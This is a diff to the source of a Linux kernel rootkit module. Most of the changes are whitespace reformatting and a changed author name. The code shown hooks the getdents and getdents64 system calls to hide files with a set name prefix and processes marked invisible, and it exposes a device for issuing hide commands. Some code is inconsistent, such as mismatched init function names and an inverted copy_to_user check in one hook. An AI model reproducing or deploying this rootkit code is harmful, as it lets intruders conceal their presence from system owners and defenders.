@@ -61,10 +61,10 @@ static void** find_sys_call_table() {
 
 static int sys_getdents64_hook(struct pt_regs* regs)
 {
-	long ret, i, j;
-	unsigned char* ptr_kernel;
-	unsigned char* ptr_user;
-	struct linux_dirent64* entry;
+    long ret, i, j;
+    unsigned char* ptr_kernel;
+    unsigned char* ptr_user;
+    struct linux_dirent64* entry;
 
     unsigned int is_proc = 0;
     unsigned long entry_long;
@@ -76,46 +76,46 @@ static int sys_getdents64_hook(struct pt_regs* regs)
         is_proc = 1;
     }
 
-	ptr_user = (unsigned char*) regs->si;
-	ptr_kernel = kmalloc(regs->dx, GFP_KERNEL);
-	ret = original_getdents(regs);
-	
-	copy_from_user(ptr_kernel, (void*) regs->si, regs->dx);
+    ptr_user = (unsigned char*) regs->si;
+    ptr_kernel = kmalloc(regs->dx, GFP_KERNEL);
+    ret = original_getdents(regs);
+    
+    copy_from_user(ptr_kernel, (void*) regs->si, regs->dx);
 
-	for(i = j = 0; i < ret; i += entry->d_reclen) {
-		entry = (struct linux_dirent64*) (ptr_kernel + i);
+    for(i = j = 0; i < ret; i += entry->d_reclen) {
+        entry = (struct linux_dirent64*) (ptr_kernel + i);
 
         if (is_proc) {
             entry_long = simple_strtoul(entry->d_name, NULL, 10);
             is_hidden = is_invisible(entry_long);
         }
 
-		if (!strncmp(entry->d_name, PREFIX, sizeof(PREFIX) - 1) || is_hidden){
-			continue;
-		}
+        if (!strncmp(entry->d_name, PREFIX, sizeof(PREFIX) - 1) || is_hidden){
+            continue;
+        }
 
-		if (!copy_to_user(ptr_user + j, entry, entry->d_reclen)){
-			ret = -EAGAIN;
-			goto end;
-		}
+        if (!copy_to_user(ptr_user + j, entry, entry->d_reclen)){
+            ret = -EAGAIN;
+            goto end;
+        }
 
-		j += entry->d_reclen;
-	}
-	if (ret > 0){
-		ret = j;
-	}
+        j += entry->d_reclen;
+    }
+    if (ret > 0){
+        ret = j;
+    }
 
 end:
-	kfree(ptr_kernel);
-	return ret;
+    kfree(ptr_kernel);
+    return ret;
 }
 
 static int sys_getdents_hook(struct pt_regs* regs)
 {
-	long ret, i, j;
-	unsigned char* ptr_kernel;
-	unsigned char* ptr_user;
-	struct linux_dirent* entry;
+    long ret, i, j;
+    unsigned char* ptr_kernel;
+    unsigned char* ptr_user;
+    struct linux_dirent* entry;
 
     unsigned int is_proc = 0;
     unsigned long entry_long;
@@ -127,40 +127,40 @@ static int sys_getdents_hook(struct pt_regs* regs)
         is_proc = 1;
     }
 
-	ptr_user = (unsigned char*) regs->si;
-	ptr_kernel = kmalloc(regs->dx, GFP_KERNEL);
-	ret = original_getdents(regs);
-	
-	copy_from_user(ptr_kernel, (void*) regs->si, regs->dx);
+    ptr_user = (unsigned char*) regs->si;
+    ptr_kernel = kmalloc(regs->dx, GFP_KERNEL);
+    ret = original_getdents(regs);
+    
+    copy_from_user(ptr_kernel, (void*) regs->si, regs->dx);
 
-	for(i = j = 0; i < ret; i += entry->d_reclen) {
+    for(i = j = 0; i < ret; i += entry->d_reclen) {
         is_hidden = 0;
-		entry = (struct linux_dirent*) (ptr_kernel + i);
+        entry = (struct linux_dirent*) (ptr_kernel + i);
     
         if (is_proc) {
             entry_long = simple_strtoul(entry->d_name, NULL, 10);
             is_hidden = is_invisible(entry_long);
         }
 
-		if (!strncmp(entry->d_name, PREFIX, sizeof(PREFIX) - 1) ||
+        if (!strncmp(entry->d_name, PREFIX, sizeof(PREFIX) - 1) ||
             is_hidden){
-			continue;
-		}
+            continue;
+        }
 
-		if (copy_to_user(ptr_user + j, entry, entry->d_reclen)){
-			ret = -EAGAIN;
-			goto end;
-		}
+        if (copy_to_user(ptr_user + j, entry, entry->d_reclen)){
+            ret = -EAGAIN;
+            goto end;
+        }
 
-		j += entry->d_reclen;
-	}
-	if (ret > 0){
-		ret = j;
-	}
+        j += entry->d_reclen;
+    }
+    if (ret > 0){
+        ret = j;
+    }
 
 end:
-	kfree(ptr_kernel);
-	return ret;
+    kfree(ptr_kernel);
+    return ret;
 }
 
 static unsigned int hook_getdents(void){
@@ -292,9 +292,9 @@ static void make_string_invisible(char* to_write, size_t len){
 static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset){
     char* to_write;
 
-	if (len <= *offset) {
-		return 0;
-	}
+    if (len <= *offset) {
+        return 0;
+    }
 
     spin_lock(&last_command_lock);
     if (!last_command) {
@@ -303,12 +303,12 @@ static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *of
 
     to_write = kmalloc(len, GFP_KERNEL);
 
-	if (last_command == get_process_cmd){
+    if (last_command == get_process_cmd){
         make_string_process(to_write, len);
-	}
-	if (last_command == get_invisible_cmd){
+    }
+    if (last_command == get_invisible_cmd){
         make_string_invisible(to_write, len);    
-	}
+    }
 
     last_command = 0;
     spin_unlock(&last_command_lock);
@@ -352,16 +352,16 @@ static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, lof
 
     if (cmd == cmd_get_process) {
         spin_lock(&last_command_lock);
-	    last_command = get_process_cmd;
+        last_command = get_process_cmd;
         spin_unlock(&last_command_lock);
-	    return len;
+        return len;
     }
 
     if (cmd == cmd_get_invisible) {
         spin_lock(&last_command_lock);
-	    last_command = get_invisible_cmd;
+        last_command = get_invisible_cmd;
         spin_unlock(&last_command_lock);
-	    return len;
+        return len;
     }
 
     if (cmd == cmd_make_invisible) {
@@ -373,7 +373,7 @@ static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, lof
             else{
                 make_invisible(pid_cmd);
             }
-	    return len;
+        return len;
         }
     }
 
@@ -475,6 +475,6 @@ module_init(start_coodkid);
 module_exit(stop_coolkid);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("stan1slas");
+MODULE_AUTHOR("stan");
 MODULE_DESCRIPTION("That hella coolkid");
 MODULE_VERSION("1");
